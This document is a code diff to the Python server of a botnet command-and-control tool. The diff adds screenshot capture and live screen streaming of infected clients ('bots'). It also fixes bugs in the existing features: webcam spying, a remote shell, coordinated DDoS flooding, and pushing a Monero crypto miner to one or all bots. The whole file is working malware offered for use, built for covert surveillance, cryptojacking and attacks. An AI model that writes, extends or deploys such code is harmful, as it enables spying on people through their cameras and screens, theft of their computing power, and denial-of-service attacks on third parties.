@@ -25,9 +25,9 @@ server:asyncio.Server = None
 
 server_commands_task:asyncio.Task = None
 shell_task:asyncio.Task = None
-stream_cam_task:asyncio.Task = None
 
-stream_cam_flag = True
+stream_cam_flag = asyncio.Event()
+stream_screen_flag = asyncio.Event()
 
 prompt_prefix = "server:~$ "
 shell_prompt_prefix = "> "
@@ -86,35 +86,56 @@ def main_gui():
 # Gets called whenever a client connects
 async def handle_client(reader:asyncio.StreamReader, writer:asyncio.StreamWriter):
     global shell_task
-    global stream_cam_task
     
     try:
+        # When a client connects, it is put into a client class, and the appended to a client list
         id = len(clients) + 1
         ip = writer.get_extra_info("peername")
         client = Client(id, ip, writer, reader)
         clients.append(client)
         
+        # Checks the dataflow from client -> server
         while True:
             try:
+                # Formats the header so it can be used to check which kind of information it is
                 header_data = await client.reader.readuntil(b"\n")
                 header_parts = header_data.split(b":")
                 header_parts = [h.strip() for h in header_parts]
                 
+                # Get the readlength and from there gets the exact amount of data
                 byte_length = int(header_parts[header_parts.index(b"byte-length") + 1])
                 data = await client.reader.readexactly(byte_length)
                 
+                # Incase the data is from a cam stream
                 if b"stream-cam-marker" in header_parts:
-                    if stream_cam_flag:
+                    if not stream_cam_flag.is_set(): 
                         process_stream_cam(client, data)
-                    else:
-                        asyncio.create_task(reset_cam_flag())
+                    else: 
+                        asyncio.create_task(reset_cam_stream_flag())
+                        
+                # Incase the data is from a shell command
                 elif b"shell-marker" in header_parts:
                     shell_task = asyncio.create_task(process_shell(data, client))
-                elif b"miner-marker":
-                    console.print()
-            except Exception as e:
+                    
+                # Incase the data is from a miner setup
+                elif b"miner-marker" in header_parts:
+                    console.print(data)
+                    
+                # Incase the data is a screenshot
+                elif b"screenshot-marker" in header_parts:
+                    process_screenshot(client, data)
+                    
+                elif b"stream-screen-marker" in header_parts:
+                    if not stream_screen_flag.is_set():
+                        await process_stream_screen(client, data)
+                    else:
+                        asyncio.create_task(reset_screen_stream_flag())
+                
+            except (asyncio.CancelledError, ConnectionRefusedError, asyncio.exceptions.IncompleteReadError, ConnectionResetError):
+                console.print(f"[cyan](*) Bot ID={client.id} disconnected[/cyan]")
                 return
-                #console.print(f"[red](-) Error: {e}[/red]")
+            except Exception as e:
+                console.print(f"[red](-) Error: {e}[/red]")
     except (asyncio.CancelledError, ConnectionRefusedError, asyncio.exceptions.IncompleteReadError, ConnectionResetError) as e:
         console.print(f"[red](-) Connection Error: {e}[/red]")
     except Exception as e:
@@ -128,7 +149,7 @@ async def server_commands():
     while True:
         command = await async_input(f"\n{prompt_prefix}")
         await parse_command(command)
-        await asyncio.sleep(0.01)
+        await asyncio.sleep(1)
         
 # Parse commands to client
 async def parse_command(command:str):
@@ -161,6 +182,10 @@ async def parse_command(command:str):
             stream_cam(tokens)
         elif command == "miner":
             miner(tokens)
+        elif command == "screenshot":
+            await take_screenshot(tokens)
+        elif command == "stream_screen":
+            await stream_screen(tokens)
         elif command == "quit":
             sys.exit()
         else:
@@ -179,6 +204,7 @@ async def get_info(tokens:list):
     try:
         client = get_client_from_id(get_arg(tokens, "-id"))
         
+        # Prints out the ip and id of clients
         console.print(f"[cyan]Client ID: {client.id}[/cyan]")
         console.print(f"[cyan]IP: {client.ip}[/cyan]")
     except (ValueError, IndexError):
@@ -189,6 +215,7 @@ async def do_remove(tokens:list):
     try:
         client = get_client_from_id(get_arg(tokens, "-id"))
         
+        # Send the 'delete_self' command the the client chosen
         client.writer.write("delete_self".encode())
         await client.writer.drain()
         client.writer.close()
@@ -200,10 +227,12 @@ async def do_remove(tokens:list):
 async def flood(tokens:list):
     global is_flooding
     try:
+        # Check if the clients are already running a flood attack
         if is_flooding:
             console.print("[cyan](*) A flooding attack is already happening, stop it with 'stop_flood'[/cyan]")
             return
         
+        # Send the flood command to all clients
         tokens = " ".join(tokens)
         for c in clients:
             c.writer.write(str(tokens).encode())
@@ -217,11 +246,14 @@ async def flood(tokens:list):
 # Stops the flood attack (DDOS)
 async def stop_flood():
     global is_flooding
+    
     try:
+        # Check if a flood is already running
         if not is_flooding:
             console.print("[cyan](*) There is no flooding attack currently ongoing[/cyan]")
             return
         
+        # Stops all client's flood attack
         for c in clients:
             c.writer.write("stop_flood".encode())
             await c.writer.drain()
@@ -235,28 +267,40 @@ async def stop_flood():
 async def shell(tokens):
     global server_commands_task
     
-    client = get_client_from_id(get_arg(tokens, "-id"))
-    console.print(f"[cyan](*) Opened shell to client id: {client.id}\nClose with 'q'[/cyan]")
-    
-    command = await async_input(f"\n{shell_prompt_prefix}")
+    try:
+        client = get_client_from_id(get_arg(tokens, "-id"))
+        console.print(f"[cyan](*) Opened shell to client id: {client.id}\nClose with 'q'[/cyan]")
         
-    if command == "q":
+        # Server input
+        command = await async_input(f"\n{shell_prompt_prefix}")
+        
+        # If command is 'q' then close the shell
+        if command == "q":
+            server_commands_task = asyncio.create_task(server_commands())
+            await server_commands_task
+            return
+        
+        # Create the net packet and send the command to the client
+        client.writer.write(f"shell {command}".encode())
+    except (ValueError, IndexError):
+        console.print("[red](-) Formatting Erorr: 'shell -id (ID)'[/red]")
         server_commands_task = asyncio.create_task(server_commands())
         await server_commands_task
         return
-    
-    client.writer.write(f"shell {command}".encode())
 
 # Function to process the shell response from the client
 async def process_shell(response_data:bytes, client:Client):
     global server_commands_task
     
+    # Decode and print the data from the client
     response_data = response_data.decode().splitlines()
     response_data = "\n".join(response_data)
     console.print(f"[cyan]{response_data}[/cyan]")
     
+    # The server shell input
     command = await async_input(f"\n{shell_prompt_prefix}")
-        
+    
+    # If the command is 'q' then close the shell
     if command == "q":
         server_commands_task = asyncio.create_task(server_commands())
         await server_commands_task
@@ -269,8 +313,8 @@ def stream_cam(tokens:list):
     try:
         client = get_client_from_id(get_arg(tokens, "-id"))
         
+        # Sends the command to the client
         client.writer.write("stream_cam".encode())
-        cv2.namedWindow(f"Bot ID: {client.id}")
         console.print("[cyan](*) Getting bot cam...[/cyan]")
     except (ValueError, IndexError):
         console.print("[red](-) Formatting Error: 'stream_cam -id (ID)'[/red]")
@@ -279,23 +323,22 @@ def stream_cam(tokens:list):
 
 # Process the webcam data, and display it on the screen
 def process_stream_cam(client:Client, frame_data):
-    global stream_cam_flag
-    
+    # Decode the frame and show it in a OpenCV window
     frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
-    cv2.imshow(f"Bot ID: {client.id}", frame)
+    cv2.imshow(f"-Cam- Bot ID: {client.id}", frame)
     
     key = cv2.waitKey(1) & 0xFF
     
+    # If 'q' is pressed, close the window and stop the stream
     if key == ord("q") or key == 27:
         client.writer.write("stop_stream_cam".encode())
-        cv2.destroyWindow(f"Bot ID: {client.id}")
-        stream_cam_flag = False
+        cv2.destroyWindow(f"-Cam- Bot ID: {client.id}")
+        stream_cam_flag.set()
 
 # Used to bypass error, where the function 'process_stream_cam' is called after it's been exited
-async def reset_cam_flag():
-    global stream_cam_flag
+async def reset_cam_stream_flag():
     await asyncio.sleep(2)
-    stream_cam_flag = True
+    stream_cam_flag.clear()
     
 # Download crypto miner on the client pc
 def miner(tokens:list):
@@ -303,6 +346,8 @@ def miner(tokens:list):
         id = get_arg(tokens, "-id")
         xmr_adress = get_arg(tokens, "-xmraddr")
         
+        # Check if the id is all, if it is then send the miner to all bots connected, 
+        # if it a specific ID send to that specific bot
         if id == "ALL":
             for c in clients:
                 c.writer.write(f"miner {xmr_adress}".encode())
@@ -315,7 +360,63 @@ def miner(tokens:list):
         console.print("[cyan](*) Setting up crypto miner[/cyan]")
     except (ValueError, IndexError):
         console.print("[red](-) Formatting Error: 'miner -id (ID/ALL) -xmraddr (XMR ADRESS)[/red]'")
+
+# Gets a screenshot of the client screen
+async def take_screenshot(tokens:list):
+    try:
+        client = get_client_from_id(get_arg(tokens, "-id"))
+        
+        client.writer.write(f"screenshot".encode())
+        await client.writer.drain()
+    except (ValueError, IndexError):
+        console.print("[red](-) Formatting Error: 'screenshot -id (ID)'[/red]")
+        
+def process_screenshot(client:Client, frame_data):
+    frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
     
+    if not os.path.exists("./screenshots/"):
+        console.print("[cyan](*) Dir './screenshots/' doesn't exist\n(*) Creating Dir...[/cyan]")
+        os.mkdir('./screenshots/')
+        console.print("[cyan](*) './screenshots/' created[/cyan]")
+    
+    filename = f'Client{client.id}_'
+    counter = 1
+    
+    while os.path.exists(f"./screenshots/{filename}{counter}.jpg"):
+        counter += 1
+    
+    console.print(f"[cyan](*) File saved in: ./screenshots/{filename}{counter}[/cyan]")
+    cv2.imwrite(f"./screenshots/{filename}{counter}.jpg", frame)
+    
+async def stream_screen(tokens:list):    
+    try:
+        client = get_client_from_id(get_arg(tokens, "-id"))
+        
+        client.writer.write(f"stream_screen".encode())
+        await client.writer.drain()
+        console.print("[cyan](*) Streaming Screen...")
+    except (ValueError, IndexError):
+        console.print("[red](-) Formatting Error: 'stream_screen -id (ID)'")
+        
+async def process_stream_screen(client:Client, frame_data):
+    # Decode the frame
+    frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
+    cv2.namedWindow(f"-Screen- Bot ID:{client.id}", cv2.WINDOW_KEEPRATIO)
+    cv2.imshow(f"-Screen- Bot ID:{client.id}", frame)
+    
+    # Set up the exit key
+    key = cv2.waitKey(1) & 0XFF
+    
+    # Exit the screen stream
+    if key == ord("q") or key == 27:
+        client.writer.write("stop_stream_screen".encode())
+        cv2.destroyWindow(f"-Screen- Bot ID:{client.id}")
+        stream_screen_flag.set()
+
+async def reset_screen_stream_flag():
+    await asyncio.sleep(2)
+    stream_screen_flag.clear()
+
 def output_help():
     console.print("""
 [bright_red]╔═════════════════════════════════════════════╗
